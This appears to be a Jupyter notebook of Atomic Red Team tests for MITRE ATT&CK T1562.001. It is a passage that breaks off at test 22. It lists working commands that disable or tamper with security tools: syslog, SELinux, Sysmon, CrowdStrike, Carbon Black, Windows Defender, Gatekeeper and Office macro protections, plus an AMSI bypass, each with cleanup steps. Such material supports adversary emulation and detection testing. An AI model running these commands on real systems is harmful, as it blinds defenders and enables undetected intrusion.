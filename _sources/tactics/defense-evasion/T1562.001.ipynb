{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "91635f70",
   "metadata": {},
   "source": "# T1562.001 - Disable or Modify Tools\nAdversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)"
  },
  {
   "cell_type": "markdown",
   "id": "4660f664",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "1f806a20",
   "metadata": {},
   "source": "### Atomic Test #1 - Disable syslog\nDisables syslog collection\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Package with rsyslog must be on system\n\n##### Check Prereq Commands:\n```sh\nif (rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed) > /dev/null; then exit 0; else exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\nsudo (which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog) \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "21ce1456",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ca86a774",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsystemctl stop rsyslog ; systemctl disable rsyslog\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7373b9e4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "8603f6f8",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsystemctl start rsyslog ; systemctl enable rsyslog\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f302ad22",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "290796a6",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Disable Cb Response",
    "Disable the Cb Response service\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e881350",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "d7cab7b4",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Disable SELinux",
    "Disables SELinux enforcement\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsetenforce 0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6bbcedd0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "419525b2",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsetenforce 1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7bcdf1e4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7d348207",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Stop Crowdstrike Falcon on Linux",
    "Stop and disable Crowdstrike Falcon on Linux\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9d87fd71",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "8f730109",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo systemctl enable falcon-sensor.service\nsudo systemctl start falcon-sensor.service\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7bb0c958",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0eacbbb8",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Disable Carbon Black Response",
    "Disables Carbon Black Response\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d1d1f398",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "81225af1",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "52cfc341",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3481aa53",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Disable LittleSnitch",
    "Disables LittleSnitch\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4cfb1c6d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "675153ad",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eb6b3f0e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fc39512e",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Disable OpenDNS Umbrella",
    "Disables OpenDNS Umbrella\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7aca7b3d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "1499f932",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "83a79be9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "34312fcf",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Disable macOS Gatekeeper",
    "Disables macOS Gatekeeper\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo spctl --master-disable\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54039828",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "2a37d7a2",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo spctl --master-enable\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7f000262",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8d2c5c2b",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Stop and unload Crowdstrike Falcon on macOS",
    "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist\nsudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "104dfed9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "bad87f23",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.falcond.plist\nsudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a1ca2313",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "addf4c19",
   "metadata": {},
   "source": "### Atomic Test #10 - Unload Sysmon Filter Driver\nUnloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Sysmon must be downloaded\n\n##### Check Prereq Commands:\n```cmd\nif ((cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") -or (Test-Path $env:Temp\\Sysmon\\Sysmon.exe)) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$env:TEMP\\Sysmon.zip\"\nExpand-Archive $env:TEMP\\Sysmon.zip $env:TEMP\\Sysmon -Force\nRemove-Item $env:TEMP\\Sysmon.zip -Force\n\n```\n##### Description: sysmon must be Installed\n\n##### Check Prereq Commands:\n```cmd\nif(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```cmd\nif(cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") { C:\\Windows\\Sysmon.exe -accepteula -i } else\n{ Set-Location $env:TEMP\\Sysmon\\; .\\Sysmon.exe -accepteula -i}\n\n```\n##### Description: sysmon filter must be loaded\n\n##### Check Prereq Commands:\n```cmd\nif(fltmc.exe filters | findstr SysmonDrv) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```cmd\nsysmon -u\nsysmon -accepteula -i\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fa0aa86e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fcdea95d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nfltmc.exe unload SysmonDrv\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0a0bfec8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "8366ece6",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsysmon -u -i > nul 2>&1\nsysmon -i -accepteula -i > nul 2>&1\n%temp%\\Sysmon\\sysmon.exe -u > nul 2>&1\n%temp%\\Sysmon\\sysmon.exe -accepteula -i > nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cc732c41",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "76ad5138",
   "metadata": {},
   "source": "### Atomic Test #11 - Uninstall Sysmon\nUninstall Sysinternals Sysmon for Defense Evasion\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Sysmon executable must be available\n\n##### Check Prereq Commands:\n```cmd\nif(cmd /c where sysmon) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n$parentpath = Split-Path \"PathToAtomicsFolder\\T1562.001\\bin\\sysmon.exe\"; $zippath = \"$parentpath\\Sysmon.zip\"\nNew-Item -ItemType Directory $parentpath -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$zippath\"\nExpand-Archive $zippath $parentpath -Force; Remove-Item $zippath\nif(-not ($Env:Path).contains($parentpath)){$Env:Path += \";$parentpath\"}\n\n```\n##### Description: Sysmon must be installed\n\n##### Check Prereq Commands:\n```cmd\nif(cmd /c sc query sysmon) { exit 0} else { exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\ncmd /c sysmon -i -accepteula\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e185fd67",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 11 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2785bb09",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsysmon -u\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e595250b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "325e85e1",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsysmon -i -accepteula >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "48c49d10",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2e36ed77",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - AMSI Bypass - AMSI InitFailed",
    "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0a758501",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "24bcdf38",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b3f031bf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f6c95aec",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - AMSI Bypass - Remove AMSI Provider Reg Key",
    "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nRemove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6ebded3f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "167fe69a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nNew-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "74d143eb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8830bf8b",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - Disable Arbitrary Security Windows Service",
    "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet.exe stop McAfeeDLPAgentService\nsc.exe config McAfeeDLPAgentService start= disabled\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "487708b2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "bfb3fd91",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsc.exe config McAfeeDLPAgentService start= auto >nul 2>&1\nnet.exe start McAfeeDLPAgentService >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d0fc3272",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 14 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fe57827d",
   "metadata": {},
   "source": [
    "### Atomic Test #15 - Tamper with Windows Defender ATP PowerShell",
    "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f4bb200c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "c7f6eac0",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableScriptScanning 0\nSet-MpPreference -DisableBlockAtFirstSeen 0\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "57c6b3af",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 15 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5f7742ef",
   "metadata": {},
   "source": [
    "### Atomic Test #16 - Tamper with Windows Defender Command Prompt",
    "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a6726763",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "c1e22a2b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsc start WinDefend >nul 2>&1\nsc config WinDefend start=enabled >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5aff77c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 16 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2a335edf",
   "metadata": {},
   "source": [
    "### Atomic Test #17 - Tamper with Windows Defender Registry",
    "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f2697670",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 17"
  },
  {
   "cell_type": "markdown",
   "id": "ba5f05cb",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c63c21ef",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 17 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8d3164a8",
   "metadata": {},
   "source": [
    "### Atomic Test #18 - Disable Microsoft Office Security Features",
    "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15e778f4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 18"
  },
  {
   "cell_type": "markdown",
   "id": "aac71401",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "32de4cc4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 18 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "80b9cc5d",
   "metadata": {},
   "source": [
    "### Atomic Test #19 - Remove Windows Defender Definition Files",
    "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cddd8ee6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 19"
  },
  {
   "cell_type": "markdown",
   "id": "55999bc1",
   "metadata": {},
   "source": [
    "### Atomic Test #20 - Stop and Remove Arbitrary Security Windows Service",
    "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStop-Service -Name McAfeeDLPAgentService\nRemove-Service -Name McAfeeDLPAgentService\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a01c55e6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 20"
  },
  {
   "cell_type": "markdown",
   "id": "8abc5bf1",
   "metadata": {},
   "source": [
    "### Atomic Test #21 - Uninstall Crowdstrike Falcon on Windows",
    "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nif (Test-Path \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\") {. \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba0ccd2f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 21"
  },
  {
   "cell_type": "markdown",
   "id": "acd9b6b1",
   "metadata": {},
   "source": [
    "### Atomic Test #22 - Tamper with Windows Defender Evade Scanning -Folder",
    "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$excludedpath= \"C:\\Temp\"\nAdd-MpPreference -ExclusionPath $excludedpath```"
   ]
  },
  {
